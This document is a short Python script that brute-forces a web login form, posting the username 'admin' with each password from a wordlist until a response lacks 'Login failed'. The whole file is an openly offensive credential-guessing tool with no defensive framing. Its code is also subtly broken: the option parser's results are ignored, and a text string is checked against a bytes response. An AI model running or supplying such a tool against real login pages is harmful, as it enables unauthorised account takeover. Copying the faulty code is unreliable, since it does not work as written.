import optparse
import requests

def brute_force_password(target, wordlist):
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target URL.")
    parser.add_option("-w", "--wordlist", dest="wordlist", help="Wordlist.")
    (options, arguments) = parser.parse_args()

    if not target:
        parser.error("[-] Please specify a target, use --help for more info.")
    elif not wordlist:
        parser.error("[-] Please specify a wordlist, use --help for more info.")

    data = {"username" : "admin", "password" : "pass", "Login" : "submit"}
    response = requests.post(target, data=data)

    with open(wordlist, "r") as wordlist:
        for line in wordlist:
            word = line.strip()
            data["password"] = word
            response = requests.post(target, data=data)
            if "Login failed" not in response.content:
                return word

    return "Could not find the password!"
